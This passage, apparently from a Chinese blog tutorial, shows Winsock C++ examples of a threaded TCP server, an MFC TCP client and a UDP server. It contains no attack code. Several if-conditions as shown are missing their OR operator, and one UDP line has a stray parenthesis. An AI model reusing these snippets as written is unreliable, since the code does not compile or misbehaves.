class="string">&lt;Winsock2.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> comment(lib, <span class="string">&quot;Ws2_32.lib&quot;</span>)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/// &lt;summary&gt;</span></span><br><span class="line"><span class="comment">/// 初始化套接字库</span></span><br><span class="line"><span class="comment">/// &lt;/summary&gt;</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">initialization</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    WORD w_req = <span class="built_in">MAKEWORD</span>(<span class="number">2</span>, <span class="number">2</span>);<span class="comment">//版本号</span></span><br><span class="line">    WSADATA wsadata;</span><br><span class="line">    <span class="type">int</span> err;</span><br><span class="line">    err = <span class="built_in">WSAStartup</span>(w_req, &amp;wsadata);</span><br><span class="line">    <span class="keyword">if</span> (err != <span class="number">0</span>) &#123;</span><br><span class="line">        cout &lt;&lt; <span class="string">&quot;初始化套接字库失败！&quot;</span> &lt;&lt; endl;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        cout &lt;&lt; <span class="string">&quot;初始化套接字库成功！&quot;</span> &lt;&lt; endl;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//检测版本号</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">LOBYTE</span>(wsadata.wVersion) != <span class="number">2</span>  <span class="built_in">HIBYTE</span>(wsadata.wHighVersion) != <span class="number">2</span>) &#123;</span><br><span class="line">        cout &lt;&lt; <span class="string">&quot;套接字库版本号不符！&quot;</span> &lt;&lt; endl;</span><br><span class="line">        <span class="built_in">WSACleanup</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        cout &lt;&lt; <span class="string">&quot;套接字库版本正确！&quot;</span> &lt;&lt; endl;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//填充服务端地址信息</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">DWORD WINAPI <span class="title">ThreadProc</span><span class="params">(LPVOID lpParameter)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    SOCKET sClient = (SOCKET)lpParameter;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (<span class="literal">true</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">// 此处PACKAGE为自定义数据结构</span></span><br><span class="line">        PACKAGE pkgForm;</span><br><span class="line">        <span class="comment">// 接收数据并对数据反序列化</span></span><br><span class="line">        <span class="type">int</span> nRet = <span class="built_in">recv</span>(sClient, (<span class="type">char</span>*)&amp;pkgForm, <span class="built_in">sizeof</span>(PACKAGE), <span class="number">0</span>);</span><br><span class="line">        <span class="keyword">if</span> (nRet == <span class="number">0</span>  nRet == SOCKET_ERROR)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="built_in">WSAGetLastError</span>() == WSAECONNRESET)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;远程主机强迫关闭了一个现有的连接\r\n&quot;</span>);</span><br><span class="line">                <span class="comment">// 当客户端断开连接时，关闭socket并退出线程</span></span><br><span class="line">              <span class="built_in">closesocket</span>(sClient);</span><br><span class="line">                <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">            &#123;</span><br><span class="line">                <span class="comment">// 其他问题则跳过本次循环</span></span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// <span class="doctag">TODO:</span> 进行包的数据分发由各自函数解析函数</span></span><br><span class="line">        <span class="comment">// <span class="doctag">TODO:</span> 需要将socket存入一个链表或动态数组中进行保存，以便消息广播等作用。在多线程中访问全局数据需要做线程同步</span></span><br><span class="line">        </span><br><span class="line">    <span class="comment">// 缓解cpu压力</span></span><br><span class="line">        <span class="built_in">Sleep</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">initialization</span>();</span><br><span class="line">    <span class="comment">//1）创建socket</span></span><br><span class="line">    SOCKET sockServer = <span class="built_in">socket</span>(AF_INET, SOCK_STREAM, IPPROTO_TCP);</span><br><span class="line">    <span class="keyword">if</span> (sockServer == INVALID_SOCKET)</span><br><span class="line">    &#123;</span><br><span class="line">        cout &lt;&lt; <span class="string">&quot;socket 创建失败 \r\n&quot;</span> &lt;&lt; endl;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">//绑定端口 127.0.0.1 回环地址   </span></span><br><span class="line">    sockaddr_in siServer;</span><br><span class="line">    siServer.sin_family = AF_INET;</span><br><span class="line">    siServer.sin_port = <span class="built_in">htons</span>(<span class="number">0x9527</span>); <span class="comment">// 服务器监听端口</span></span><br><span class="line">    siServer.sin_addr.S_un.S_addr = <span class="built_in">inet_addr</span>(<span class="string">&quot;0.0.0.0&quot;</span>); <span class="comment">// 服务器地址，也可以是0.0.0.0</span></span><br><span class="line">    <span class="type">int</span> nRet = <span class="built_in">bind</span>(sockServer, (sockaddr*)&amp;siServer, <span class="built_in">sizeof</span>(siServer));</span><br><span class="line">    <span class="keyword">if</span> (nRet == SOCKET_ERROR)</span><br><span class="line">    &#123;</span><br><span class="line">        cout &lt;&lt; <span class="string">&quot;绑定地址失败 \r\n&quot;</span> &lt;&lt; endl;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        cout &lt;&lt; <span class="string">&quot;服务器启动完毕 \r\n&quot;</span> &lt;&lt; endl;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">listen</span>(sockServer, SOMAXCONN) == SOCKET_ERROR)</span><br><span class="line">    &#123;</span><br><span class="line">        cout &lt;&lt; <span class="string">&quot;端口监听失败 \r\n&quot;</span> &lt;&lt; endl;</span><br><span class="line">    &#125;</span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;服务端正在监听连接，请稍候....&quot;</span> &lt;&lt; endl;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 循环读取消息</span></span><br><span class="line">    <span class="keyword">while</span> (<span class="literal">true</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">//接受连接请求</span></span><br><span class="line">        sockaddr_in siAccept;</span><br><span class="line">        <span class="type">int</span> nLen = <span class="built_in">sizeof</span>(SOCKADDR_IN);</span><br><span class="line">        <span class="comment">// 当有客户连接是阻塞取消</span></span><br><span class="line">        SOCKET sClient = ::<span class="built_in">accept</span>(sockServer, (SOCKADDR*)&amp;siAccept, &amp;nLen);</span><br><span class="line">        <span class="keyword">if</span> (sClient == SOCKET_ERROR) &#123;</span><br><span class="line">            cout &lt;&lt; <span class="string">&quot;连接失败！&quot;</span> &lt;&lt; endl;</span><br><span class="line">            <span class="built_in">WSACleanup</span>();</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        cout &lt;&lt; <span class="string">&quot;连接建立[&quot;</span> &lt;&lt; <span class="built_in">inet_ntoa</span>(siAccept.sin_addr) &lt;&lt; <span class="string">&quot;:&quot;</span> &lt;&lt; <span class="built_in">ntohs</span>(siAccept.sin_port) &lt;&lt; <span class="string">&quot;]，准备接受数据&quot;</span> &lt;&lt; endl;</span><br><span class="line">    <span class="comment">// 连接建立成功则启动一个线程用来和客户端通讯</span></span><br><span class="line">        <span class="comment">// 将客户端的socket传入线程中用来通讯</span></span><br><span class="line">        HANDLE hThread = <span class="built_in">CreateThread</span>(<span class="literal">NULL</span>, <span class="number">0</span>, ThreadProc, (PVOID)sClient, <span class="number">0</span>, <span class="literal">NULL</span>);</span><br><span class="line">        <span class="keyword">if</span> (hThread == <span class="literal">NULL</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            cout &lt;&lt; <span class="string">&quot;工作线程建立失败&quot;</span> &lt;&lt; endl;</span><br><span class="line">            <span class="built_in">closesocket</span>(sClient);</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            cout &lt;&lt; <span class="string">&quot;工作线程建立成功&quot;</span> &lt;&lt; endl;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 关闭线程句柄，但是线程仍在运行</span></span><br><span class="line">    <span class="built_in">CloseHandle</span>(hThread);</span><br><span class="line">        <span class="built_in">Sleep</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//关闭套接字</span></span><br><span class="line">    <span class="built_in">closesocket</span>(sockServer);</span><br><span class="line">    <span class="comment">//释放DLL资源</span></span><br><span class="line">    <span class="built_in">WSACleanup</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="客户端"><a href="#客户端" class="headerlink" title="客户端"></a>客户端</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> WIN32_LEAN_AND_MEAN</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Winsock2.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> comment(lib, <span class="string">&quot;Ws2_32.lib&quot;</span>)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 自定义用户消息，用来多线程中同步修改UI数据</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> WM_UPDATE_UI WM_USER + 0x1</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/// &lt;summary&gt;</span></span><br><span class="line"><span class="comment">/// 初始化套接字库</span></span><br><span class="line"><span class="comment">/// &lt;/summary&gt;</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">initialization</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    WORD w_req = <span class="built_in">MAKEWORD</span>(<span class="number">2</span>, <span class="number">2</span>);<span class="comment">//版本号</span></span><br><span class="line">    WSADATA wsadata;</span><br><span class="line">    <span class="type">int</span> err;</span><br><span class="line">    err = <span class="built_in">WSAStartup</span>(w_req, &amp;wsadata);</span><br><span class="line">    <span class="keyword">if</span> (err != <span class="number">0</span>) &#123;</span><br><span class="line">        cout &lt;&lt; <span class="string">&quot;初始化套接字库失败！&quot;</span> &lt;&lt; endl;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        cout &lt;&lt; <span class="string">&quot;初始化套接字库成功！&quot;</span> &lt;&lt; endl;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//检测版本号</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">LOBYTE</span>(wsadata.wVersion) != <span class="number">2</span>  <span class="built_in">HIBYTE</span>(wsadata.wHighVersion) != <span class="number">2</span>) &#123;</span><br><span class="line">        cout &lt;&lt; <span class="string">&quot;套接字库版本号不符！&quot;</span> &lt;&lt; endl;</span><br><span class="line">        <span class="built_in">WSACleanup</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        cout &lt;&lt; <span class="string">&quot;套接字库版本正确！&quot;</span> &lt;&lt; endl;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 多线程处理服务器返回消息</span></span><br><span class="line"><span class="function">DWORD WINAPI <span class="title">RecvSockMessage</span><span class="params">(LPVOID lpParameter)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// 类中调用多线程的时候将类传入函数</span></span><br><span class="line">    CClientDlg* pThis = (CClientDlg*)lpParameter;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (<span class="literal">true</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">// 反序列化</span></span><br><span class="line">        <span class="comment">// PACKAGE同服务端</span></span><br><span class="line">        PACKAGE pkgForm;</span><br><span class="line">        <span class="comment">// 接收服务端返回消息，若无返回则会阻塞</span></span><br><span class="line">        <span class="type">int</span> nRet = <span class="built_in">recv</span>(pThis-&gt;m_socketClient, (<span class="type">char</span>*)&amp;pkgForm, <span class="built_in">sizeof</span>(PACKAGE), <span class="number">0</span>);</span><br><span class="line">        <span class="keyword">if</span> (nRet == <span class="number">0</span>  nRet == SOCKET_ERROR)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    </span><br><span class="line">        <span class="comment">// 线程安全的将每个封包传入类中的封包队列中</span></span><br><span class="line">        pThis-&gt;m_clsLock.<span class="built_in">Lock</span>();</span><br><span class="line">        pThis-&gt;m_lstPakToHandle.<span class="built_in">push_back</span>(pkgForm);</span><br><span class="line">        pThis-&gt;m_clsLock.<span class="built_in">Unlock</span>();</span><br><span class="line">        <span class="comment">// 发送用户自定义消息进行UI更新以及数据包处理</span></span><br><span class="line">        pThis-&gt;<span class="built_in">PostMessage</span>(WM_UPDATE_UI);</span><br><span class="line">        <span class="built_in">Sleep</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 用户自定义消息的处理函数</span></span><br><span class="line"><span class="function">afx_msg LRESULT <span class="title">CClientDlg::OnUpdateUI</span><span class="params">(WPARAM wParam, LPARAM lParam)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// 线程安全获取封包</span></span><br><span class="line">    m_clsLock.<span class="built_in">Lock</span>();</span><br><span class="line">    <span class="keyword">auto</span> pkgForm = m_lstPakToHandle.<span class="built_in">front</span>();</span><br><span class="line">    <span class="comment">// 获取一个包将队列中的包去除一个</span></span><br><span class="line">    m_lstPakToHandle.<span class="built_in">pop_front</span>();</span><br><span class="line">    m_clsLock.<span class="built_in">Unlock</span>();</span><br><span class="line">  </span><br><span class="line">    <span class="comment">// TODO 数据包分发函数进行处理</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 在不通环境下将此段代码加入各自的初始化函数中</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">InitSocket</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">initialization</span>();</span><br><span class="line">  <span class="comment">// 初始服务器数据</span></span><br><span class="line">    m_serverInfo.m_wPort = <span class="built_in">htons</span>(<span class="number">0x9527</span>); <span class="comment">// 服务器端口</span></span><br><span class="line">    m_serverInfo.m_addr.S_un.S_addr = <span class="built_in">inet_addr</span>(<span class="string">&quot;127.0.0.1&quot;</span>); <span class="comment">// 服务器IP</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 服务器连接结构体</span></span><br><span class="line">    SOCKADDR_IN sServerAddr;</span><br><span class="line">    sServerAddr.sin_family = AF_INET;</span><br><span class="line">    sServerAddr.sin_addr = m_serverInfo.m_addr;</span><br><span class="line">    sServerAddr.sin_port = m_serverInfo.m_wPort;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 创建socket</span></span><br><span class="line">    <span class="comment">// m_socketClient 为全局或类中成员，类型为SOCKET</span></span><br><span class="line">    m_socketClient = <span class="built_in">socket</span>(AF_INET, SOCK_STREAM, IPPROTO_TCP);</span><br><span class="line">    <span class="keyword">if</span> (m_socketClient == INVALID_SOCKET)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">AfxMessageBox</span>(<span class="string">&quot;程序异常，请检查软件权限&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 连接服务器</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">connect</span>(m_socketClient, (SOCKADDR*)&amp;sServerAddr, <span class="built_in">sizeof</span>(SOCKADDR)) == SOCKET_ERROR) &#123;</span><br><span class="line">        <span class="built_in">AfxMessageBox</span>(<span class="string">&quot;服务器连接失败&quot;</span>);</span><br><span class="line">        <span class="built_in">WSACleanup</span>();</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 启动收数据线程</span></span><br><span class="line">    m_hThread = <span class="built_in">CreateThread</span>(<span class="literal">NULL</span>, <span class="number">0</span>, RecvSockMessage, <span class="keyword">this</span>, <span class="number">0</span>, <span class="literal">NULL</span>);</span><br><span class="line">    <span class="keyword">if</span> (m_hThread == <span class="literal">NULL</span>)</span><br><span class="line">    &#123;   </span><br><span class="line">        <span class="built_in">AfxMessageBox</span>(<span class="string">&quot;程序异常 \r\n&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  </span><br><span class="line">    <span class="comment">// 当客户端和服务器连接成功后，可以使用如下代码获取客户端的本地端口</span></span><br><span class="line">    sockaddr_in si;</span><br><span class="line">    <span class="type">int</span> nLen = <span class="built_in">sizeof</span>(si);</span><br><span class="line">    <span class="built_in">getsockname</span>(m_socketClient, (sockaddr*)&amp;si, &amp;nLen);</span><br><span class="line">    m_localUserInfo.m_wPort = si.sin_port;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// <span class="doctag">TODO:</span> 发送自己的数据包，比如登录包</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="UDP例子"><a href="#UDP例子" class="headerlink" title="UDP例子"></a>UDP例子</h1><hr><h2 id="服务端-1"><a href="#服务端-1" class="headerlink" title="服务端"></a>服务端</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> WIN32_LEAN_AND_MEAN</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Winsock2.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> comment(lib, <span class="string">&quot;Ws2_32.lib&quot;</span>)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/// &lt;summary&gt;</span></span><br><span class="line"><span class="comment">/// 初始化套接字库</span></span><br><span class="line"><span class="comment">/// &lt;/summary&gt;</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">initialization</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    WORD w_req = <span class="built_in">MAKEWORD</span>(<span class="number">2</span>, <span class="number">2</span>);<span class="comment">//版本号</span></span><br><span class="line">    WSADATA wsadata;</span><br><span class="line">    <span class="type">int</span> err;</span><br><span class="line">    err = <span class="built_in">WSAStartup</span>(w_req, &amp;wsadata);</span><br><span class="line">    <span class="keyword">if</span> (err != <span class="number">0</span>) &#123;</span><br><span class="line">        cout &lt;&lt; <span class="string">&quot;初始化套接字库失败！&quot;</span> &lt;&lt; endl;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        cout &lt;&lt; <span class="string">&quot;初始化套接字库成功！&quot;</span> &lt;&lt; endl;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//检测版本号</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">LOBYTE</span>(wsadata.wVersion) != <span class="number">2</span>  <span class="built_in">HIBYTE</span>(wsadata.wHighVersion) != <span class="number">2</span>) &#123;</span><br><span class="line">        cout &lt;&lt; <span class="string">&quot;套接字库版本号不符！&quot;</span> &lt;&lt; endl;</span><br><span class="line">        <span class="built_in">WSACleanup</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        cout &lt;&lt; <span class="string">&quot;套接字库版本正确！&quot;</span> &lt;&lt; endl;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//填充服务端地址信息</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">initialization</span>();</span><br><span class="line">    <span class="comment">// 创建socket</span></span><br><span class="line">    SOCKET sockServer = <span class="built_in">socket</span>(AF_INET, SOCK_DGRAM, IPPROTO_UDP); <span class="comment">// udp协议</span></span><br><span class="line">    <span class="keyword">if</span> (sockServer == INVALID_SOCKET)</span><br><span class="line">    &#123;</span><br><span class="line">        cout &lt;&lt; <span class="string">&quot;socket 创建失败 \r\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//绑定服务器IP和端口  </span></span><br><span class="line">    sockaddr_in siServer;</span><br><span class="line">    siServer.sin_family = AF_INET;</span><br><span class="line">    siServer.sin_port = <span class="built_in">htons</span>(<span class="number">0x9527</span>);</span><br><span class="line">    siServer.sin_addr.S_un.S_addr = <span class="built_in">inet_addr</span>(<span class="string">&quot;0.0.0.0&quot;</span>);</span><br><span class="line">    <span class="comment">// </span></span><br><span class="line">    <span class="type">int</span> nRet = <span class="built_in">bind</span>(sockServer, (sockaddr*)&amp;siServer, <span class="built_in">sizeof</span>(siServer));</span><br><span class="line">    <span class="keyword">if</span> (nRet == SOCKET_ERROR)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;绑定地址失败 \r\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;服务器启动完毕 \r\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 维护一个在线列表</span></span><br><span class="line">    list&lt;USERINFO&gt; lstOnlineClient;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 循环读取消息</span></span><br><span class="line">    <span class="keyword">while</span> (<span class="literal">true</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        sockaddr_in siClient = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">        <span class="type">int</span> nLen = <span class="built_in">sizeof</span>(siClient);</span><br><span class="line">        <span class="comment">// 反序列化</span></span><br><span class="line">        PACKAGE pkgForm;</span><br><span class="line">        <span class="type">int</span> nRet = <span class="built_in">recvfrom</span>(sockServer, (<span class="type">char</span>*)&amp;pkgForm, <span class="built_in">sizeof</span>(PACKAGE), <span class="number">0</span>, (sockaddr*)&amp;siClient, &amp;nLen);</span><br><span class="line">        <span class="keyword">if</span> (nRet == <span class="number">0</span>  nRet == SOCKET_ERROR)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="built_in">WSAGetLastError</span>() == WSAECONNRESET)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;远程主机强迫关闭了一个现有的连接\r\n&quot;</span>);</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// <span class="doctag">TODO:</span> 数据处理</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 释放资源</span></span><br><span class="line">    <span class="built_in">closesocket</span>(sockServer);</span><br><span class="line">    <span class="built_in">WSACleanup</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="客户端-1"><a href="#客户端-1" class="headerlink" title="客户端"></a>客户端</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span 